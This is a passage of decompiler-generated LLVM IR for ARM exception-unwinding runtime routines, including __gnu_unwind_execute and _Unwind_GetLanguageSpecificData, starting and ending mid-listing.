  uselistorder i32* @r1, { 186, 18, 19, 20, 4, 187, 188, 65, 66, 82, 45, 2, 190, 46, 189, 169, 47, 48, 49, 21, 67, 1, 68, 69, 22, 193, 23, 5, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 6, 211, 212, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 71, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 63, 3, 81, 24, 176, 120, 121, 213, 25, 215, 216, 217, 218, 132, 133, 31, 93, 32, 214, 26, 33, 177, 178, 179, 180, 181, 182, 183, 184, 185, 44, 112, 113, 171, 7, 167, 168, 8, 172, 175, 173, 9, 174, 94, 95, 27, 159, 154, 96, 160, 170, 134, 135, 12, 34, 35, 36, 37, 38, 39, 40, 10, 221, 222, 223, 224, 0, 225, 30, 83, 122, 155, 97, 219, 220, 191, 192, 28, 13, 98, 123, 124, 125, 126, 127, 29, 136, 137, 99, 100, 101, 41, 42, 43, 102, 103, 104, 106, 107, 105, 84, 85, 87, 89, 86, 14, 88, 15, 90, 91, 92, 138, 108, 109, 110, 111, 114, 115, 116, 16, 117, 118, 119, 128, 129, 130, 17, 131, 163, 164, 11, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 156, 157, 158, 161, 162, 165, 166 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 4, 32, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 10, 9, 3, 11, 12, 13, 14, 15, 29, 30, 26, 27, 5, 6, 2, 7, 1, 8, 28, 0, 31 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19248 = load i32, i32* @r0, align 4
  ret i32 %v1_19248
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19250 = load i32, i32* @r0, align 4
  ret i32 %v1_19250
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19264 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19268 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_19264, i32 0)
  ret i32 %v2_19268

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19288 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1928c = call i32 @__gnu_Unwind_Resume(i32 %v2_19288, i32 0)
  ret i32 %v2_1928c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_192ac = ptrtoint i32* %stack_var_-68 to i32
  %v2_192b0 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_192ac, i32 0)
  ret i32 %v2_192b0

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_192d0 = ptrtoint i32* %stack_var_-68 to i32
  %v6_192d4 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_192d0, i32 %arg2, i8* %arg3, i32 %v2_192d0)
  ret i32 %v6_192d4

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_19300 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_19308 = add i32 %tmp1, 76
  %v2_19308 = inttoptr i32 %v1_19308 to i32*
  %v3_19308 = load i32, i32* %v2_19308, align 4
  %v1_1930c = add i32 %v3_19308, 7
  %v2_1930c = inttoptr i32 %v1_1930c to i8*
  %v3_1930c = load i8, i8* %v2_1930c, align 1
  %v4_1930c = zext i8 %v3_1930c to i32
  %v1_19310 = add i32 %v3_19308, 8
  %v3_19314 = mul nuw nsw i32 %v4_1930c, 4
  %v2_19318 = add i32 %v3_19314, %v1_19310
  %v3_19318 = inttoptr i32 %v2_19318 to i8*
  ret i8* %v3_19318
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_19328 = load i32, i32* @r6, align 4
  %v21_19328 = load i32, i32* @lr, align 4
  %v0_1932c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1932c, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_1933c

dec_label_pc_1933c:                               ; preds = %dec_label_pc_1933c.backedge, %entry
  %v3_19348 = phi i32 [ %v0_1933c.pre, %dec_label_pc_1933c.backedge ], [ %tmp, %entry ]
  %v1_1933c = add i32 %v3_19348, 8
  %v2_1933c = inttoptr i32 %v1_1933c to i8*
  %v3_1933c = load i8, i8* %v2_1933c, align 1
  %v4_1933c = zext i8 %v3_1933c to i32
  store i32 %v4_1933c, i32* %r3.global-to-local, align 4
  %v2_19340 = icmp eq i8 %v3_1933c, 0
  store i1 %v2_19340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19340, label %dec_label_pc_19350, label %.thread

.thread:                                          ; preds = %dec_label_pc_1933c
  %v2_19344 = add nsw i32 %v4_1933c, -1
  store i32 %v2_19344, i32* %r3.global-to-local, align 4
  %v2_19348 = trunc i32 %v2_19344 to i8
  store i8 %v2_19348, i8* %v2_1933c, align 1
  %v0_1934c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1934c.pr.pr, label %.thread.dec_label_pc_19350_crit_edge, label %dec_label_pc_19378

.thread.dec_label_pc_19350_crit_edge:             ; preds = %.thread
  %v0_19350.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19350

dec_label_pc_19350:                               ; preds = %.thread.dec_label_pc_19350_crit_edge, %dec_label_pc_1933c
  %v0_19350 = phi i32 [ %v0_19350.pre, %.thread.dec_label_pc_19350_crit_edge ], [ %v3_19348, %dec_label_pc_1933c ]
  %v1_19350 = add i32 %v0_19350, 9
  %v2_19350 = inttoptr i32 %v1_19350 to i8*
  %v3_19350 = load i8, i8* %v2_19350, align 1
  %v4_19350 = zext i8 %v3_19350 to i32
  store i32 %v4_19350, i32* %r3.global-to-local, align 4
  %v2_19354 = icmp eq i8 %v3_19350, 0
  store i1 %v2_19354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19354, label %dec_label_pc_19458, label %dec_label_pc_1935c

dec_label_pc_1935c:                               ; preds = %dec_label_pc_1944c, %dec_label_pc_19350
  %v2_19360 = phi i32 [ %v0_1944c, %dec_label_pc_1944c ], [ %v0_19350, %dec_label_pc_19350 ]
  %v0_1935c = phi i32 [ %v4_1944c, %dec_label_pc_1944c ], [ %v4_19350, %dec_label_pc_19350 ]
  %v1_1935c = add nsw i32 %v0_1935c, -1
  store i32 %v1_1935c, i32* %r3.global-to-local, align 4
  %v1_19360 = trunc i32 %v1_1935c to i8
  %v3_19360 = add i32 %v2_19360, 9
  %v4_19360 = inttoptr i32 %v3_19360 to i8*
  store i8 %v1_19360, i8* %v4_19360, align 1
  %v0_19364 = load i32, i32* @r5, align 4
  %v1_19364 = add i32 %v0_19364, 4
  %v2_19364 = inttoptr i32 %v1_19364 to i32*
  %v3_19364 = load i32, i32* %v2_19364, align 4
  store i32 %v3_19364, i32* %r2.global-to-local, align 4
  %v1_19368 = inttoptr i32 %v3_19364 to i32*
  %v2_19368 = load i32, i32* %v1_19368, align 4
  store i32 %v2_19368, i32* %r0.global-to-local, align 4
  %v4_19368 = add i32 %v3_19364, 4
  store i32 %v4_19368, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_19370 = inttoptr i32 %v0_19364 to i32*
  store i32 %v2_19368, i32* %v1_19370, align 4
  %v5_19370 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19370, i32* %v2_19364, align 4
  %v0_19374 = load i32, i32* %r3.global-to-local, align 4
  %v1_19374 = trunc i32 %v0_19374 to i8
  %v2_19374 = load i32, i32* @r5, align 4
  %v3_19374 = add i32 %v2_19374, 8
  %v4_19374 = inttoptr i32 %v3_19374 to i8*
  store i8 %v1_19374, i8* %v4_19374, align 1
  br label %dec_label_pc_19378

dec_label_pc_19378:                               ; preds = %.thread, %dec_label_pc_1935c, %.thread6
  %v0_19378 = load i32, i32* @r5, align 4
  %v1_19378 = inttoptr i32 %v0_19378 to i32*
  %v2_19378 = load i32, i32* %v1_19378, align 4
  %v3_1937c = udiv i32 %v2_19378, 16777216
  store i32 %v3_1937c, i32* @r4, align 4
  store i32 %v3_1937c, i32* %ip.global-to-local, align 4
  %v3_19384 = mul i32 %v2_19378, 256
  store i32 %v3_19384, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_19378, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_19384, i32* %v1_19378, align 4
  br i1 %tmp183, label %dec_label_pc_19458, label %dec_label_pc_19394

dec_label_pc_19394:                               ; preds = %dec_label_pc_19378
  %v0_19394 = load i32, i32* @r4, align 4
  %v1_19394 = and i32 %v0_19394, 128
  store i32 %v1_19394, i32* %r1.global-to-local, align 4
  %v2_19394 = icmp eq i32 %v1_19394, 0
  store i1 %v2_19394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19394, label %dec_label_pc_19470, label %dec_label_pc_1939c

dec_label_pc_1939c:                               ; preds = %dec_label_pc_19394
  %v1_1939c = and i32 %v0_19394, 240
  store i32 %v1_1939c, i32* @r6, align 4
  %v7_193a0 = icmp eq i32 %v1_1939c, 128
  store i1 %v7_193a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_193a0, label %dec_label_pc_193a8, label %dec_label_pc_194cc

dec_label_pc_193a8:                               ; preds = %dec_label_pc_1939c
  %v0_193a8 = load i32, i32* @r5, align 4
  %v1_193a8 = add i32 %v0_193a8, 8
  %v2_193a8 = inttoptr i32 %v1_193a8 to i8*
  %v3_193a8 = load i8, i8* %v2_193a8, align 1
  %v4_193a8 = zext i8 %v3_193a8 to i32
  store i32 %v4_193a8, i32* %r3.global-to-local, align 4
  %v2_193ac = icmp eq i8 %v3_193a8, 0
  store i1 %v2_193ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193ac, label %dec_label_pc_193bc, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_193a8
  %v2_193b0 = add nsw i32 %v4_193a8, -1
  store i32 %v2_193b0, i32* %r3.global-to-local, align 4
  %v2_193b4 = trunc i32 %v2_193b0 to i8
  store i8 %v2_193b4, i8* %v2_193a8, align 1
  %v0_193b8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_193b8.pr.pr, label %.thread3.dec_label_pc_193bc_crit_edge, label %dec_label_pc_193ec

.thread3.dec_label_pc_193bc_crit_edge:            ; preds = %.thread3
  %v0_193bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_193bc

dec_label_pc_193bc:                               ; preds = %.thread3.dec_label_pc_193bc_crit_edge, %dec_label_pc_193a8
  %v2_193d0 = phi i32 [ %v0_193bc.pre, %.thread3.dec_label_pc_193bc_crit_edge ], [ %v0_193a8, %dec_label_pc_193a8 ]
  %v1_193bc = add i32 %v2_193d0, 9
  %v2_193bc = inttoptr i32 %v1_193bc to i8*
  %v3_193bc = load i8, i8* %v2_193bc, align 1
  %v4_193bc = zext i8 %v3_193bc to i32
  store i32 %v4_193bc, i32* %r3.global-to-local, align 4
  %v2_193c0 = icmp eq i8 %v3_193bc, 0
  store i1 %v2_193c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193c0, label %dec_label_pc_193fc, label %dec_label_pc_193cc

dec_label_pc_193cc:                               ; preds = %dec_label_pc_193bc
  %v1_193cc = add nsw i32 %v4_193bc, -1
  store i32 %v1_193cc, i32* %r3.global-to-local, align 4
  %v1_193d0 = trunc i32 %v1_193cc to i8
  store i8 %v1_193d0, i8* %v2_193bc, align 1
  %v0_193d4 = load i32, i32* @r5, align 4
  %v1_193d4 = add i32 %v0_193d4, 4
  %v2_193d4 = inttoptr i32 %v1_193d4 to i32*
  %v3_193d4 = load i32, i32* %v2_193d4, align 4
  store i32 %v3_193d4, i32* %r2.global-to-local, align 4
  %v1_193d8 = inttoptr i32 %v3_193d4 to i32*
  %v2_193d8 = load i32, i32* %v1_193d8, align 4
  store i32 %v2_193d8, i32* %r0.global-to-local, align 4
  %v4_193d8 = add i32 %v3_193d4, 4
  store i32 %v4_193d8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_193d8, i32* %v2_193d4, align 4
  %v0_193e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_193e4 = trunc i32 %v0_193e4 to i8
  %v2_193e4 = load i32, i32* @r5, align 4
  %v3_193e4 = add i32 %v2_193e4, 8
  %v4_193e4 = inttoptr i32 %v3_193e4 to i8*
  store i8 %v1_193e4, i8* %v4_193e4, align 1
  %v0_193e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_193e8 = load i32, i32* @r5, align 4
  %v2_193e8 = inttoptr i32 %v1_193e8 to i32*
  store i32 %v0_193e8, i32* %v2_193e8, align 4
  br label %dec_label_pc_193ec

dec_label_pc_193ec:                               ; preds = %.thread3, %dec_label_pc_193cc
  %v0_193ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_193ec, i32* %r3.global-to-local, align 4
  %v3_193f0 = mul i32 %v0_193ec, 256
  store i32 %v3_193f0, i32* %r0.global-to-local, align 4
  %v1_193f4 = load i32, i32* @r5, align 4
  %v2_193f4 = inttoptr i32 %v1_193f4 to i32*
  store i32 %v3_193f0, i32* %v2_193f4, align 4
  %v0_193f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_193f8 = udiv i32 %v0_193f8, 16777216
  br label %dec_label_pc_193fc

dec_label_pc_193fc:                               ; preds = %dec_label_pc_193bc, %dec_label_pc_193ec
  %storemerge133 = phi i32 [ %v3_193f8, %dec_label_pc_193ec ], [ 176, %dec_label_pc_193bc ]
  %v1_193fc = load i32, i32* %ip.global-to-local, align 4
  %v4_193fc = mul i32 %v1_193fc, 256
  %v5_193fc = or i32 %v4_193fc, %storemerge133
  store i32 %v5_193fc, i32* %r2.global-to-local, align 4
  %v7_19400 = icmp eq i32 %v5_193fc, 32768
  store i1 %v7_19400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19400, label %dec_label_pc_1960c, label %dec_label_pc_19408

dec_label_pc_19408:                               ; preds = %dec_label_pc_193fc
  %v3_19408 = mul i32 %v5_193fc, 16
  store i32 %v3_19408, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_19418 = and i32 %v3_19408, 65520
  store i32 %v3_19418, i32* %r2.global-to-local, align 4
  %v0_1941c = load i32, i32* @r7, align 4
  store i32 %v0_1941c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_19424 = call i32 @_Unwind_VRS_Pop(i32 %v0_1941c, i32 %v3_19418, i32 0, i32 0)
  store i32 %v4_19424, i32* %r0.global-to-local, align 4
  %v2_19428 = icmp eq i32 %v4_19424, 0
  store i1 %v2_19428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19428, label %dec_label_pc_19430, label %dec_label_pc_1960c

dec_label_pc_19430:                               ; preds = %dec_label_pc_19408
  %v0_19430 = load i32, i32* @r5, align 4
  %v1_19430 = add i32 %v0_19430, 8
  %v2_19430 = inttoptr i32 %v1_19430 to i8*
  %v3_19430 = load i8, i8* %v2_19430, align 1
  %v4_19430 = zext i8 %v3_19430 to i32
  store i32 %v4_19430, i32* %r3.global-to-local, align 4
  %v0_19434 = load i32, i32* @r4, align 4
  %v1_19434 = and i32 %v0_19434, 32768
  %v2_19434 = icmp eq i32 %v1_19434, 0
  store i1 %v2_19434, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19434, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_19430
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_19430, %bb147
  %v2_1943c = icmp eq i8 %v3_19430, 0
  store i1 %v2_1943c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1943c, label %dec_label_pc_1944c, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_19440 = add nsw i32 %v4_19430, -1
  store i32 %v2_19440, i32* %r3.global-to-local, align 4
  %v2_19444 = trunc i32 %v2_19440 to i8
  store i8 %v2_19444, i8* %v2_19430, align 1
  %v0_19448.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19448.pr.pr, label %.thread6.dec_label_pc_1944c_crit_edge, label %dec_label_pc_19378

.thread6.dec_label_pc_1944c_crit_edge:            ; preds = %.thread6
  %v0_1944c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1944c

dec_label_pc_1944c:                               ; preds = %bb148, %.thread6.dec_label_pc_1944c_crit_edge
  %v0_1944c = phi i32 [ %v0_1944c.pre, %.thread6.dec_label_pc_1944c_crit_edge ], [ %v0_19430, %bb148 ]
  %v1_1944c = add i32 %v0_1944c, 9
  %v2_1944c = inttoptr i32 %v1_1944c to i8*
  %v3_1944c = load i8, i8* %v2_1944c, align 1
  %v4_1944c = zext i8 %v3_1944c to i32
  store i32 %v4_1944c, i32* %r3.global-to-local, align 4
  %v2_19450 = icmp eq i8 %v3_1944c, 0
  store i1 %v2_19450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19450, label %dec_label_pc_19458, label %dec_label_pc_1935c

dec_label_pc_19458:                               ; preds = %dec_label_pc_1944c, %dec_label_pc_19350, %dec_label_pc_19378
  %v0_19458 = load i32, i32* @sl, align 4
  %v2_19458 = icmp eq i32 %v0_19458, 0
  store i1 %v2_19458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19458, label %dec_label_pc_19520, label %bb149

bb149:                                            ; preds = %dec_label_pc_19458
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19464

dec_label_pc_19464:                               ; preds = %bb149, %dec_label_pc_199d4, %dec_label_pc_19874, %dec_label_pc_19698, %dec_label_pc_19650, %dec_label_pc_1960c, %dec_label_pc_19520
  %v1_1946c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_199d4 ], [ 9, %dec_label_pc_19874 ], [ 9, %dec_label_pc_19698 ], [ 9, %dec_label_pc_19650 ], [ 9, %dec_label_pc_1960c ], [ %v0_19554, %dec_label_pc_19520 ]
  store i32 %v9_19328, i32* %r6.global-to-local, align 4
  store i32 %v21_19328, i32* @lr, align 4
  ret i32 %v1_1946c

dec_label_pc_19470:                               ; preds = %dec_label_pc_19394
  %v1_19470 = mul i32 %v0_19394, 4
  %v3_19474 = and i32 %v1_19470, 252
  store i32 %v3_19474, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19480 = load i32, i32* @r7, align 4
  store i32 %v0_19480, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_19488 = add nuw nsw i32 %v3_19474, 4
  store i32 %v1_19488, i32* %r6.global-to-local, align 4
  %v5_19490 = call i32 @_Unwind_VRS_Get(i32 %v0_19480, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19494 = load i32, i32* @r4, align 4
  %v1_19494 = and i32 %v0_19494, 64
  %v2_19494 = icmp eq i32 %v1_19494, 0
  store i1 %v2_19494, i1* %cpsr_z.global-to-local, align 1
  %v4_1949c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_194a8 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_194a8
  %storemerge160.p = select i1 %v2_19494, i32 %v2_194a8, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1949c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_194c4 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_194c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1933c.backedge

dec_label_pc_1933c.backedge:                      ; preds = %dec_label_pc_19470, %dec_label_pc_194ec, %dec_label_pc_19970, %dec_label_pc_1963c, %dec_label_pc_19674, %dec_label_pc_195f4, %dec_label_pc_19860
  %v0_1933c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1933c

dec_label_pc_194cc:                               ; preds = %dec_label_pc_1939c
  %v7_194cc = icmp eq i32 %v1_1939c, 144
  store i1 %v7_194cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_194cc, label %dec_label_pc_194d4, label %dec_label_pc_19614

dec_label_pc_194d4:                               ; preds = %dec_label_pc_194cc
  %v1_194d4 = urem i32 %v0_19394, 16
  store i32 %v1_194d4, i32* %r2.global-to-local, align 4
  %v2_194d8 = icmp eq i32 %v1_194d4, 15
  store i1 %v2_194d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_194d8, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_194d4
  %v8_194dc = icmp eq i32 %v1_194d4, 13
  store i1 %v8_194dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_194dc, label %bb154, label %dec_label_pc_194ec

.thread21:                                        ; preds = %dec_label_pc_194d4
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1960c

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1960c

dec_label_pc_194ec:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_194f8 = load i32, i32* @r7, align 4
  store i32 %v0_194f8, i32* %r0.global-to-local, align 4
  %v5_19500 = call i32 @_Unwind_VRS_Get(i32 %v0_194f8, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19508 = load i32, i32* @r7, align 4
  store i32 %v0_19508, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_19518 = call i32 @_Unwind_VRS_Set(i32 %v0_19508, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19518, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1933c.backedge

dec_label_pc_19520:                               ; preds = %dec_label_pc_19458
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19530 = load i32, i32* @r7, align 4
  store i32 %v0_19530, i32* %r0.global-to-local, align 4
  %v7_19538 = call i32 @_Unwind_VRS_Get(i32 %v0_19530, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_1953c = load i32, i32* @r7, align 4
  store i32 %v0_1953c, i32* %r0.global-to-local, align 4
  %v0_19540 = load i32, i32* @sl, align 4
  store i32 %v0_19540, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_19540, i32* %r3.global-to-local, align 4
  %v5_19550 = call i32 @_Unwind_VRS_Set(i32 %v0_1953c, i32 %v0_19540, i32 15, i32 %v0_19540, i8* bitcast (i32* @0 to i8*))
  %v0_19554 = load i32, i32* @sl, align 4
  store i32 %v0_19554, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19464

dec_label_pc_1955c:                               ; preds = %dec_label_pc_19750
  %v7_1955c = icmp eq i32 %v0_19750, 199
  store i1 %v7_1955c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1955c, label %dec_label_pc_19830, label %dec_label_pc_19564

dec_label_pc_19564:                               ; preds = %dec_label_pc_1955c
  %v1_19564 = and i32 %v0_19394, 248
  store i32 %v1_19564, i32* %r3.global-to-local, align 4
  %v7_19568 = icmp eq i32 %v1_19564, 192
  store i1 %v7_19568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19568, label %.thread24, label %dec_label_pc_19580

.thread24:                                        ; preds = %dec_label_pc_19564
  %v2_1956c = urem i32 %v0_19394, 16
  %v2_19570 = add nuw nsw i32 %v2_1956c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_19578 = or i32 %v2_19570, 655360
  store i32 %v2_19578, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1963c

dec_label_pc_19580:                               ; preds = %dec_label_pc_19564
  %v7_19580 = icmp eq i32 %v0_19750, 200
  store i1 %v7_19580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19580, label %dec_label_pc_197c4, label %dec_label_pc_19588

dec_label_pc_19588:                               ; preds = %dec_label_pc_19580
  %v7_19588 = icmp eq i32 %v0_19750, 201
  store i1 %v7_19588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19588, label %dec_label_pc_19590, label %dec_label_pc_1960c

dec_label_pc_19590:                               ; preds = %dec_label_pc_19588
  %v0_19590 = load i32, i32* @r5, align 4
  %v1_19590 = add i32 %v0_19590, 8
  %v2_19590 = inttoptr i32 %v1_19590 to i8*
  %v3_19590 = load i8, i8* %v2_19590, align 1
  %v4_19590 = zext i8 %v3_19590 to i32
  store i32 %v4_19590, i32* %r3.global-to-local, align 4
  %v2_19594 = icmp eq i8 %v3_19590, 0
  store i1 %v2_19594, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19594, label %dec_label_pc_195a4, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_19590
  %v2_19598 = add nsw i32 %v4_19590, -1
  store i32 %v2_19598, i32* %r3.global-to-local, align 4
  %v2_1959c = trunc i32 %v2_19598 to i8
  store i8 %v2_1959c, i8* %v2_19590, align 1
  %v0_195a0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_195a0.pr.pr, label %.thread26.dec_label_pc_195a4_crit_edge, label %dec_label_pc_195d8

.thread26.dec_label_pc_195a4_crit_edge:           ; preds = %.thread26
  %v0_195a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_195a4

dec_label_pc_195a4:                               ; preds = %.thread26.dec_label_pc_195a4_crit_edge, %dec_label_pc_19590
  %v2_195bc = phi i32 [ %v0_195a4.pre, %.thread26.dec_label_pc_195a4_crit_edge ], [ %v0_19590, %dec_label_pc_19590 ]
  %v1_195a4 = add i32 %v2_195bc, 9
  %v2_195a4 = inttoptr i32 %v1_195a4 to i8*
  %v3_195a4 = load i8, i8* %v2_195a4, align 1
  %v4_195a4 = zext i8 %v3_195a4 to i32
  store i32 %v4_195a4, i32* %r3.global-to-local, align 4
  %v2_195a8 = icmp eq i8 %v3_195a4, 0
  store i1 %v2_195a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195a8, label %dec_label_pc_195f4, label %dec_label_pc_195b8

dec_label_pc_195b8:                               ; preds = %dec_label_pc_195a4
  %v1_195b8 = add nsw i32 %v4_195a4, -1
  store i32 %v1_195b8, i32* %r3.global-to-local, align 4
  %v1_195bc = trunc i32 %v1_195b8 to i8
  store i8 %v1_195bc, i8* %v2_195a4, align 1
  %v0_195c0 = load i32, i32* @r5, align 4
  %v1_195c0 = add i32 %v0_195c0, 4
  %v2_195c0 = inttoptr i32 %v1_195c0 to i32*
  %v3_195c0 = load i32, i32* %v2_195c0, align 4
  store i32 %v3_195c0, i32* %r2.global-to-local, align 4
  %v1_195c4 = inttoptr i32 %v3_195c0 to i32*
  %v2_195c4 = load i32, i32* %v1_195c4, align 4
  store i32 %v2_195c4, i32* %r0.global-to-local, align 4
  %v4_195c4 = add i32 %v3_195c0, 4
  store i32 %v4_195c4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_195c4, i32* %v2_195c0, align 4
